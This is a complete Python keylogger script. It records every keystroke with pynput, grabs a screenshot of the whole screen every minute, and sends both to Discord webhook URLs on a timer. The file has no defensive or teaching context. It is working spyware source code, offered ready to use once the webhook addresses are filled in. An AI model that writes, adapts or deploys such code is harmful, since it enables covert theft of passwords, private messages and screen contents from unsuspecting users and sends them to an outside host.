from pynput import keyboard
from pynput.keyboard import Key
import time
import threading
import requests
from PIL import ImageGrab
from io import BytesIO

# Replace 'WEBHOOK_URL' and 'WEBHOOK_URL_SCREENS' with your actual Discord webhook URLs
WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_url'
WEBHOOK_URL_SCREENS = 'https://discord.com/api/webhooks/your_screens_webhook_url'

# Global variables
messages_to_send = []  # Placeholder for messages to send
channel_ids = {'main': 123, 'spam': 456}  # Placeholder for channel IDs
text_buffer = ""  # Placeholder for text buffer

# Variables for dynamic buffer size
last_key_press_time = time.time()
buffer_size_multiplier = 1.0  # Initial multiplier for buffer size

# Variables for screenshot capture
screenshot_interval = 60  # Capture a screenshot every 60 seconds
last_screenshot_time = time.time()

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global messages_to_send

    try:
        # Check if there are any messages to send
        if messages_to_send:
            # Convert the messages to a string
            messages_str = '\n'.join(messages_to_send)

            # Create the payload for the webhook
            payload = {
                'content': messages_str
            }

            # Send the payload to the Discord webhook
            response = requests.post(WEBHOOK_URL, json=payload)

            # Check if the request was successful (status code 2xx)
            response.raise_for_status()

            # Clear the list
            messages_to_send = []

        # Capture and send screenshot if the interval has elapsed
        global last_screenshot_time  # Add this line
        current_time = time.time()
        if current_time - last_screenshot_time >= screenshot_interval:
            screenshot = capture_screenshot()
            send_screenshot(screenshot)
            last_screenshot_time = current_time

    except requests.RequestException as e:
        # Handle request exceptions, such as connection errors
        print(f"Error sending keylogs to Discord: {e}")

    # Schedule the next execution of the function after 10 seconds
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes
def on_press(key):
    global messages_to_send, text_buffer, last_key_press_time, buffer_size_multiplier

    processed_key = str(key)[1:-1] if (str(key)[0] == '\'' and str(key)[-1] == '\'') else key

    # Calculate time between key presses
    time_since_last_press = time.time() - last_key_press_time
    last_key_press_time = time.time()

    # Adjust buffer size multiplier based on typing speed
    buffer_size_multiplier = max(1.0, min(5.0, buffer_size_multiplier + 0.1 * (1.0 - time_since_last_press)))

    keycodes = {
        Key.space: ' ',
        Key.shift: ' *`SHIFT`*',
        Key.tab: ' *`TAB`*',
        Key.backspace: ' *`<`*',
        Key.esc: ' *`ESC`*',
        Key.caps_lock: ' *`CAPS LOCK`*',
        Key.f1: ' *`F1`*',
        Key.f2: ' *`F2`*',
        Key.f3: ' *`F3`*',
        Key.f4: ' *`F4`*',
        Key.f5: ' *`F5`*',
        Key.f6: ' *`F6`*',
        Key.f7: ' *`F7`*',
        Key.f8: ' *`F8`*',
        Key.f9: ' *`F9`*',
        Key.f10: ' *`F10`*',
        Key.f11: ' *`F11`*',
        Key.f12: ' *`F12`*',
    }

    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l,
                             Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]

        if processed_key == Key.enter:
            processed_key = ''
            messages_to_send.append(text_buffer + ' *`ENTER`*')
            text_buffer = ''

        text_buffer += str(processed_key)

        if len(text_buffer) > int(1975 * buffer_size_multiplier):
            if 'wwwww' in text_buffer or 'aaaaa' in text_buffer or 'sssss' in text_buffer or 'ddddd' in text_buffer:
                messages_to_send.append(text_buffer)
            else:
                messages_to_send.append(text_buffer)
            text_buffer = ''

# Function to capture a screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    return screenshot

# Function to send a screenshot to Discord
def send_screenshot(screenshot):
    try:
        # Convert the screenshot to bytes
        screenshot_bytes = BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        # Create the payload for the webhook with an embedded image
        payload = {
            'content': 'Screenshot captured:'
        }

        files = {'file': ('screenshot.png', screenshot_bytes, 'image/png')}

        # Send the payload to the Discord webhook
        response = requests.post(WEBHOOK_URL_SCREENS, data=payload, files=files)

        # Check if the request was successful (status code 2xx)
        response.raise_for_status()

    except requests.RequestException as e:
        # Handle request exceptions, such as connection errors
        print(f"Error sending screenshot to Discord: {e}")

# Start capturing keystrokes
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Start sending keylogs and capturing screenshots to Discord
send_keylogs()

# Keep the script running
keyboard_listener.join()
